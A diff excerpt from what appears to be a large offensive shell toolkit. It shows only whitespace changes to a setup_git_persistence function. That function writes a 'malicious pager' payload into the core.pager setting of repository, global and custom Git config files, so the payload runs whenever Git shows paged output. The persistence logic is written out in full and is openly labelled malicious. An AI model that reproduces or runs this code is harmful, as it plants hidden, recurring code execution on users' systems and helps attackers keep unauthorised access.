@@ -2302,7 +2302,7 @@ setup_git_persistence() {
         if [[ ! -f $git_config ]]; then
             mkdir -p $git_repo/.git
             echo "[core]" > $git_config
-            echo "    pager = $payload" >> $git_config
+            echo "        pager = $payload" >> $git_config
             echo "[+] Created Git config with malicious pager in $git_repo"
         else
             # Check if [core] section exists, add pager under it
@@ -2310,14 +2310,14 @@ setup_git_persistence() {
                 echo "[core]" >> $git_config
             fi
             # Add pager configuration under [core] section
-            sed -i '/^\[core\]/a \    pager = '"$payload"'' $git_config
+            sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
             echo "[+] Updated existing Git config with malicious pager in $git_repo"
         fi
 
         # Add to user's global config if it doesn't exist
         if [[ ! -f $user_git_config ]]; then
             echo "[core]" > $user_git_config
-            echo "    pager = $payload" >> $user_git_config
+            echo "        pager = $payload" >> $user_git_config
             echo "[+] Created global Git config with malicious pager"
         else
             # Check if [core] section exists, add pager under it
@@ -2325,7 +2325,7 @@ setup_git_persistence() {
                 echo "[core]" >> $user_git_config
             fi
             # Add pager configuration under [core] section in global config
-            sed -i '/^\[core\]/a \    pager = '"$payload"'' $user_git_config
+            sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
             echo "[+] Updated existing global Git config with malicious pager"
         fi
     }
@@ -2348,7 +2348,7 @@ setup_git_persistence() {
 
         if [[ ! -f $path ]]; then
             echo "[core]" > $path
-            echo "    pager = $payload" >> $path
+            echo "        pager = $payload" >> $path
             echo "[+] Created custom Git config with pager in $path"
         else
             # Check if [core] section exists, add pager under it
@@ -2356,7 +2356,7 @@ setup_git_persistence() {
                 echo "[core]" >> $path
             fi
             # Add pager configuration under [core] section
-            sed -i '/^\[core\]/a \    pager = '"$payload"'' $path
+            sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
             echo "[+] Updated existing Git config with custom pager in $path"
         fi
     }
